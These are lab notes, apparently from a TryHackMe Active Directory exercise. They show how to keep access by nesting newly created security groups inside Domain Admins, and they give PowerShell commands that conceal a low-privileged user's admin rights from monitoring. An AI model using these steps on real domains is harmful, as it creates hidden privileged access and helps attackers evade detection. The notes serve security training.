# Persistence through Group Membership

If we want to persist through group membership, we may need to get creative regarding the groups we add our own accounts to for persistence:

* <mark style="color:red;">**IT Support groups**</mark> can reset passwords, which may help spread access across workstations, even if privileged accounts are restricted.
* <mark style="color:red;">**Local administrator rights**</mark> from network support groups can provide unnoticed persistence, allowing future domain compromise.
* <mark style="color:red;">**Indirect privileges**</mark> (e.g., control over Group Policy Objects) can be just as valuable as direct admin rights for persistence.

### <mark style="color:green;">Nested Groups</mark>

Nested groups are subgroups of other groups. Companies use nested groups for permission inheritance or to recreate the company’s structure in an external user directory.

<figure><img src="../../../.gitbook/assets/image (671).png" alt=""><figcaption></figcaption></figure>

While group nesting helps to organise AD, it does reduce the visibility of effective access. Take our IT Support example again. If we query AD for membership of the IT Support group, it would respond with a count of three. However, this count is not really true since it is three groups. To get an idea for effective access, we would now have to enumerate those subgroups as well. But those subgroups can also have subgroups. So the question becomes: "How many layers deep should we enumerate to get the real effective access number?"

As an attacker, we can leverage this reduced visibility to perform **persistence**. Instead of targeting the privileged groups that would provide us with access to the environment, we focus our attention on the subgroups instead. Rather than adding ourselves to a privileged group that would raise an alert, we add ourselves to a subgroup that is not being monitored.

### <mark style="color:green;">Nesting Our Persistence</mark>

Let us simulate this type of persistence by creating some of our own groups. Let's start by creating a new base group that we will hide in the People->IT Organisational Unit (OU):

```powershell
New-ADGroup -Path "OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 1" -SamAccountName "<username>_nestgroup1" -DisplayName "<username> Nest Group 1" -GroupScope Global -GroupCategory Security
```

Create another group in the People->Sales OU and add our previous group as a member:

```powershell
New-ADGroup -Path "OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "<username> Net Group 2" -SamAccountName "<username>_nestgroup2" -DisplayName "<username> Nest Group 2" -GroupScope Global -GroupCategory Security 
Add-ADGroupMember -Identity "<username>_nestgroup2" -Members "<username>_nestgroup1"
```

We can do this multiple more times by adding the previous group as a member. Let's now add that group to the Domain Admins group:

```powershell
PS C:\Users\Administrator.ZA>Add-ADGroupMember -Identity "Domain Admins" -Members "<username>_nestgroup2"
```

Lastly, we add our low-privileged user to the first group we created

```powershell
Add-ADGroupMember -Identity "<username>_nestgroup1" -Members "<low privileged username>"
```

Verify this by SSH'ing to our user in THMWRK1 and list the the directories and files of the DC

<figure><img src="../../../.gitbook/assets/image (672).png" alt=""><figcaption></figcaption></figure>

Cool, it worked. Let's verify that our group was added to the DA group

```powershell
Get-ADGroupMember -Identity "Domain Admins"
```

<figure><img src="../../../.gitbook/assets/image (674).png" alt=""><figcaption></figcaption></figure>
